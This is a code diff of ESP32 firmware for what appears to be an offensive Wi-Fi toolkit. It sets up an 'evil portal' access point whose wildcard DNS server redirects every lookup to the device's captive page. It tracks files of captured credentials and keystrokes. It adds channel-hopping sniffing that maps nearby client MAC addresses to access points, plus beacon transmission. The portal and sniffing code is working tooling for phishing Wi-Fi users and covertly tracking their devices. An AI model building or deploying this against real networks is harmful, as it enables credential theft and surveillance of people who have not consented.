+        strlcpy((char *)ap_config.ap.ssid, ap_ssid, sizeof(ap_config.ap.ssid));
+        ap_config.ap.ssid_len = strlen(ap_ssid);
     }
+    if (Password != NULL && Password[0] != '\0') {
+        ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
+        strlcpy((char *)ap_config.ap.password, Password, sizeof(ap_config.ap.password));
+    } else {
+        ap_config.ap.authmode = WIFI_AUTH_OPEN;
+        memset(ap_config.ap.password, 0, sizeof(ap_config.ap.password));
+    }
+    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
+    dhcps_offer_t dhcps_dns_value = OFFER_DNS;
+    esp_netif_dhcps_option(wifiAP, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER,
+                           &dhcps_dns_value, sizeof(dhcps_dns_value));
+    dnsserver.ip.u_addr.ip4.addr = esp_ip4addr_aton("192.168.4.1");
+    dnsserver.ip.type = ESP_IPADDR_TYPE_V4;
+    esp_netif_set_dns_info(wifiAP, ESP_NETIF_DNS_MAIN, &dnsserver);
+    ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &ap_config));
+    ESP_ERROR_CHECK(esp_wifi_start());
 
+    start_portal_webserver();
+
+    dns_server_config_t dns_config = {
+        .num_of_entries = 1,
+        .item = {{.name = "*", .if_key = NULL, .ip = {.addr = ESP_IP4TOADDR(192, 168, 4, 1)}}}};
+
+    dns_handle = start_dns_server(&dns_config);
+    if (dns_handle) {
+        printf("DNS server started, all requests will be redirected to 192.168.4.1\n");
+    } else {
+        printf("Failed to start DNS server\n");
+    }
+    
     return ESP_OK; // Add return value at the end
 }
 
 void wifi_manager_stop_evil_portal() {
+    login_done = false; // Reset login state on stop
+    current_creds_filename[0] = '\0'; // Clear saved filenames
+    current_keystrokes_filename[0] = '\0';
 
     if (dns_handle != NULL) {
         stop_dns_server(dns_handle);
@@ -879,6 +1041,13 @@ void wifi_manager_stop_monitor_mode() {
     ESP_ERROR_CHECK(esp_wifi_set_promiscuous(false));
     printf("WiFi monitor stopped.\n");
     TERMINAL_VIEW_ADD_TEXT("WiFi monitor stopped.\n");
+
+    // Stop the station scan channel hopping timer if it's active
+    if (scansta_hopping_active) {
+        stop_scansta_channel_hopping();
+    }
+
+    // NOTE: Stopping the PineAP timer (channel_hop_timer) is handled by stop_pineap_detection() in callbacks.c
 }
 
 void wifi_manager_init(void) {
@@ -2136,17 +2305,27 @@ void wifi_manager_print_scan_results_with_oui() {
             break;
         }
 
-        // Print access point information without BSSID
+        // Print access point information including BSSID
         printf("[%u] SSID: %s,\n"
+               "     BSSID: %02X:%02X:%02X:%02X:%02X:%02X,\n"
                "     RSSI: %d,\n"
                "     Company: %s\n",
-               i, ssid_str, scanned_aps[i].rssi, company_str);
+               i, ssid_str, 
+               scanned_aps[i].bssid[0], scanned_aps[i].bssid[1],
+               scanned_aps[i].bssid[2], scanned_aps[i].bssid[3],
+               scanned_aps[i].bssid[4], scanned_aps[i].bssid[5],
+               scanned_aps[i].rssi, company_str);
 
-        // Log information in terminal view without BSSID
+        // Log information in terminal view including BSSID
         TERMINAL_VIEW_ADD_TEXT("[%u] SSID: %s,\n"
+                               "     BSSID: %02X:%02X:%02X:%02X:%02X:%02X,\n"
                                "     RSSI: %d,\n"
                                "     Company: %s\n",
-                               i, ssid_str, scanned_aps[i].rssi, company_str);
+                               i, ssid_str, 
+                               scanned_aps[i].bssid[0], scanned_aps[i].bssid[1],
+                               scanned_aps[i].bssid[2], scanned_aps[i].bssid[3],
+                               scanned_aps[i].bssid[4], scanned_aps[i].bssid[5],
+                               scanned_aps[i].rssi, company_str);
     }
 }
 
@@ -2441,4 +2620,285 @@ void wifi_manager_start_beacon(const char *ssid) {
         printf("Beacon transmission already running.\n");
         TERMINAL_VIEW_ADD_TEXT("Beacon transmission already running.\n");
     }
+}
+
+// Function to provide access to the last scan results
+void wifi_manager_get_scan_results_data(uint16_t *count, wifi_ap_record_t **aps) {
+    *count = ap_count;
+    *aps = scanned_aps;
+}
+
+void wifi_manager_start_scan_with_time(int seconds) {
+    ap_manager_stop_services();
+    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
+    ESP_ERROR_CHECK(esp_wifi_start());
+
+    wifi_scan_config_t scan_config = {
+        .ssid = NULL,
+        .bssid = NULL,
+        .channel = 0,
+        .show_hidden = true
+    };
+
+    rgb_manager_set_color(&rgb_manager, 0, 50, 255, 50, false);
+
+    printf("WiFi Scan started\n");
+    printf("Please wait %d Seconds...\n", seconds);
+    TERMINAL_VIEW_ADD_TEXT("WiFi Scan started\n");
+    {
+        char buf[64]; snprintf(buf, sizeof(buf), "Please wait %d Seconds...\n", seconds);
+        TERMINAL_VIEW_ADD_TEXT(buf);
+    }
+
+    esp_err_t err = esp_wifi_scan_start(&scan_config, false);
+    if (err != ESP_OK) {
+        printf("WiFi scan failed to start: %s\n", esp_err_to_name(err));
+        TERMINAL_VIEW_ADD_TEXT("WiFi scan failed to start\n");
+        return;
+    }
+
+    vTaskDelay(pdMS_TO_TICKS(seconds * 1000));
+
+    wifi_manager_stop_scan();
+    ESP_ERROR_CHECK(esp_wifi_stop());
+    // ESP_ERROR_CHECK(ap_manager_start_services()); // Removed: Rely on caller (handle_combined_scan) to restart AP services
+}
+
+// Station Scan Channel Hopping Callback
+static void scansta_channel_hop_timer_callback(void *arg) {
+    if (!scansta_hopping_active) return; // Check if hopping should be active
+
+    scansta_current_channel = (scansta_current_channel % SCANSTA_MAX_WIFI_CHANNEL) + 1;
+    esp_wifi_set_channel(scansta_current_channel, WIFI_SECOND_CHAN_NONE);
+    // ESP_LOGI(TAG, "Station Scan Hopped to Channel: %d", scansta_current_channel); // Optional: for debugging
+}
+
+// Start the channel hopping timer for station scanning
+static esp_err_t start_scansta_channel_hopping(void) {
+    if (scansta_channel_hop_timer != NULL) {
+        ESP_LOGW(TAG, "Scansta channel hop timer already exists. Stopping and deleting first.");
+        esp_timer_stop(scansta_channel_hop_timer);
+        esp_timer_delete(scansta_channel_hop_timer);
+        scansta_channel_hop_timer = NULL;
+    }
+
+    scansta_current_channel = 1; // Start from channel 1
+    esp_wifi_set_channel(scansta_current_channel, WIFI_SECOND_CHAN_NONE); // Set initial channel
+
+    esp_timer_create_args_t timer_args = {
+        .callback = scansta_channel_hop_timer_callback,
+        .name = "scansta_channel_hop"
+    };
+
+    esp_err_t err = esp_timer_create(&timer_args, &scansta_channel_hop_timer);
+    if (err != ESP_OK) {
+        ESP_LOGE(TAG, "Failed to create scansta channel hop timer: %s", esp_err_to_name(err));
+        return err;
+    }
+
+    err = esp_timer_start_periodic(scansta_channel_hop_timer, SCANSTA_CHANNEL_HOP_INTERVAL_MS * 1000);
+    if (err != ESP_OK) {
+        ESP_LOGE(TAG, "Failed to start scansta channel hop timer: %s", esp_err_to_name(err));
+        esp_timer_delete(scansta_channel_hop_timer); // Clean up timer if start fails
+        scansta_channel_hop_timer = NULL;
+        return err;
+    }
+
+    scansta_hopping_active = true;
+    ESP_LOGI(TAG, "Station Scan Channel Hopping Started.");
+    return ESP_OK;
+}
+
+// Stop the channel hopping timer for station scanning
+static void stop_scansta_channel_hopping(void) {
+    if (scansta_channel_hop_timer) {
+        esp_timer_stop(scansta_channel_hop_timer);
+        esp_timer_delete(scansta_channel_hop_timer);
+        scansta_channel_hop_timer = NULL;
+        scansta_hopping_active = false;
+        ESP_LOGI(TAG, "Station Scan Channel Hopping Stopped.");
+    }
+}
+
+// Function to specifically start station scanning with channel hopping
+void wifi_manager_start_station_scan() {
+    // Ensure we have a list of APs to compare against first
+    if (scanned_aps == NULL || ap_count == 0) {
+        printf("No APs scanned previously. Performing initial scan...\n");
+        TERMINAL_VIEW_ADD_TEXT("Scanning APs first...\n");
+
+        // Perform a synchronous scan
+        ap_manager_stop_services(); // Stop other services that might interfere
+        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
+        ESP_ERROR_CHECK(esp_wifi_start());
+
+        wifi_scan_config_t scan_config = {
+            .ssid = NULL,
+            .bssid = NULL,
+            .channel = 0,
+            .show_hidden = true,
+            // Use a reasonable scan time
+            .scan_time = {.active.min = 450, .active.max = 500, .passive = 500}
+        };
+
+        esp_err_t err = esp_wifi_scan_start(&scan_config, true); // Block until scan done
+
+        if (err == ESP_OK) {
+            // Get the results directly, similar to wifi_manager_stop_scan()
+            uint16_t initial_ap_count = 0;
+            err = esp_wifi_scan_get_ap_num(&initial_ap_count);
+            if (err == ESP_OK) {
+                 printf("Initial scan found %u access points\n", initial_ap_count);
+                 TERMINAL_VIEW_ADD_TEXT("Initial scan found %u APs\n", initial_ap_count);
+                if (initial_ap_count > 0) {
+                    if (scanned_aps != NULL) {
+                        free(scanned_aps);
+                        scanned_aps = NULL;
+                    }
+                    scanned_aps = calloc(initial_ap_count, sizeof(wifi_ap_record_t));
+                    if (scanned_aps == NULL) {
+                        printf("Failed to allocate memory for AP info\n");
+                        ap_count = 0;
+                    } else {
+                        uint16_t actual_ap_count = initial_ap_count;
+                        err = esp_wifi_scan_get_ap_records(&actual_ap_count, scanned_aps);
+                        if (err != ESP_OK) {
+                            printf("Failed to get AP records: %s\n", esp_err_to_name(err));
+                            free(scanned_aps);
+                            scanned_aps = NULL;
+                            ap_count = 0;
+                        } else {
+                             ap_count = actual_ap_count;
+
+                              // ---- ADD THIS BLOCK START ----
+                              printf("--- Known AP BSSIDs for Station Scan ---\n");
+                              for (int k = 0; k < ap_count; k++) {
+                                  printf("[%d] BSSID: %02X:%02X:%02X:%02X:%02X:%02X (SSID: %.*s)\n", k,
+                                         scanned_aps[k].bssid[0], scanned_aps[k].bssid[1],
+                                         scanned_aps[k].bssid[2], scanned_aps[k].bssid[3],
+                                         scanned_aps[k].bssid[4], scanned_aps[k].bssid[5],
+                                         32, scanned_aps[k].ssid); // Print SSID for context
+                              }
+                              printf("----------------------------------------\n");
+                              // ---- ADD THIS BLOCK END ----
+                         }
+                     }
+                 } else {
+                      printf("Initial scan found no access points\n");
+                      ap_count = 0;
+                 }
+            } else {
+                printf("Failed to get AP count after initial scan: %s\n", esp_err_to_name(err));
+                TERMINAL_VIEW_ADD_TEXT("Failed get AP count\n");
+                 ap_count = 0;
+            }
+
+        } else {
+            printf("Initial AP scan failed: %s\n", esp_err_to_name(err));
+            TERMINAL_VIEW_ADD_TEXT("Initial AP scan failed.\n");
+            ap_count = 0; // Ensure ap_count reflects failure
+        }
+
+        // Stop STA mode before setting monitor mode
+        ESP_ERROR_CHECK(esp_wifi_stop());
+        // Note: AP Manager services are not restarted here, as monitor mode is intended next
+    } else {
+         printf("Using previously scanned AP list (%d APs).\n", ap_count);
+         TERMINAL_VIEW_ADD_TEXT("Using cached AP list.\n");
+    }
+
+    // Now start monitor mode with the callback
+    wifi_manager_start_monitor_mode(wifi_stations_sniffer_callback);
+    // Start channel hopping for station scan
+    start_scansta_channel_hopping();
+    printf("Started Station Scan (Channel Hopping Enabled)...\n");
+    TERMINAL_VIEW_ADD_TEXT("Started Station Scan (Hopping)...\n");
+}
+
+// Print combined AP/Station scan results in ASCII chart
+void wifi_manager_scanall_chart() {
+    if (ap_count == 0) {
+        printf("No APs found during scan.\n");
+        TERMINAL_VIEW_ADD_TEXT("No APs found during scan.\n");
+        return;
+    }
+
+    printf("\n--- Combined AP and Station Scan Results ---\n\n");
+    TERMINAL_VIEW_ADD_TEXT("\n--- Combined AP/STA Scan Results ---\n\n");
+
+    const char* ap_header_top =    "┌──────────────────────────────────┬───────────────────┬──────┬───────────┐";
+    const char* ap_header_mid =    "│ SSID                             │ BSSID             │ Chan │ Company   │";
+    const char* ap_header_bottom = "├──────────────────────────────────┼───────────────────┼──────┼───────────┤";
+    const char* ap_format =        "│ %-32.32s │ %02X:%02X:%02X:%02X:%02X:%02X │ %-4d │ %-9.9s │";
+    const char* ap_separator =     "├──────────────────────────────────┼───────────────────┼──────┼───────────┤";
+    const char* ap_footer =        "└──────────────────────────────────┴───────────────────┴──────┴───────────┘";
+    const char* sta_format =       "│   -> STA: %02X:%02X:%02X:%02X:%02X:%02X                                             │"; // Formatted station line
+
+
+    // Print Header Once
+    printf("%s\n", ap_header_top);
+    printf("%s\n", ap_header_mid);
+    printf("%s\n", ap_header_bottom);
+    TERMINAL_VIEW_ADD_TEXT("%s\n", ap_header_top);
+    TERMINAL_VIEW_ADD_TEXT("%s\n", ap_header_mid);
+    TERMINAL_VIEW_ADD_TEXT("%s\n", ap_header_bottom);
+
+
+    for (uint16_t i = 0; i < ap_count; i++) {
+        char ssid_temp[33];
+        memcpy(ssid_temp, scanned_aps[i].ssid, 32);
+        ssid_temp[32] = '\0';
+        const char *ssid_str = (strlen(ssid_temp) > 0) ? ssid_temp : "(Hidden)";
+
+        ECompany company = match_bssid_to_company(scanned_aps[i].bssid);
+        const char *company_str = "Unknown";
+         switch (company) {
+             case COMPANY_DLINK: company_str = "DLink"; break;
+             case COMPANY_NETGEAR: company_str = "Netgear"; break;
+             case COMPANY_BELKIN: company_str = "Belkin"; break;
+             case COMPANY_TPLINK: company_str = "TPLink"; break;
+             case COMPANY_LINKSYS: company_str = "Linksys"; break;
+             case COMPANY_ASUS: company_str = "ASUS"; break;
+             case COMPANY_ACTIONTEC: company_str = "Actiontec"; break;
+             default: company_str = "Unknown"; break;
+        }
+
+        // Print AP details line
+        char ap_details_line[200];
+        snprintf(ap_details_line, sizeof(ap_details_line), ap_format, ssid_str,
+                 scanned_aps[i].bssid[0], scanned_aps[i].bssid[1], scanned_aps[i].bssid[2],
+                 scanned_aps[i].bssid[3], scanned_aps[i].bssid[4], scanned_aps[i].bssid[5],
+                 scanned_aps[i].primary, company_str);
+        printf("%s\n", ap_details_line);
+        TERMINAL_VIEW_ADD_TEXT("%s\n", ap_details_line);
+
+        bool station_found_for_ap = false;
+        // Find and print associated stations for this AP
+        for (int j = 0; j < station_count; j++) {
+            if (memcmp(station_ap_list[j].ap_bssid, scanned_aps[i].bssid, 6) == 0) {
+                // Print station MAC using the new format
+                char sta_details_line[100];
+                snprintf(sta_details_line, sizeof(sta_details_line), sta_format,
+                         station_ap_list[j].station_mac[0], station_ap_list[j].station_mac[1],
+                         station_ap_list[j].station_mac[2], station_ap_list[j].station_mac[3],
+                         station_ap_list[j].station_mac[4], station_ap_list[j].station_mac[5]);
+                printf("%s\n", sta_details_line);
+                TERMINAL_VIEW_ADD_TEXT("%s\n", sta_details_line);
+                station_found_for_ap = true; // Mark that we printed at least one station
+            }
+        }
+
+        // Print separator line below the AP (and its stations) if it's not the last AP
+        if (i < ap_count - 1) {
+            printf("%s\n", ap_separator);
+            TERMINAL_VIEW_ADD_TEXT("%s\n", ap_separator);
+        }
+    }
+
+    // Print Footer Once
+    printf("%s\n", ap_footer);
+    TERMINAL_VIEW_ADD_TEXT("%s\n", ap_footer);
+
+    printf("\n--- End of Results ---\n\n");
+    TERMINAL_VIEW_ADD_TEXT("--- End of Results ---\n\n");
 }
